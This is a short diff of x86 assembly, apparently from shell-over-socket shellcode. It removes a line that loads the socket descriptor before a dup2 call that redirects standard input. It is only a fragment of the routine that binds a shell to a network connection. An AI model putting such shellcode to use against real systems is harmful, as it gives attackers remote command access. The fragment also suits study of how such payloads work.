@@ -76,7 +76,6 @@ jmp _start
 
 dupfd:
 mov al, 0x3F ; mov dup2 syscall to al for STDIN
-mov ebx, edx ; mov socketfd in ebx
 
 xor ecx, ecx
 xor ebx, ebx
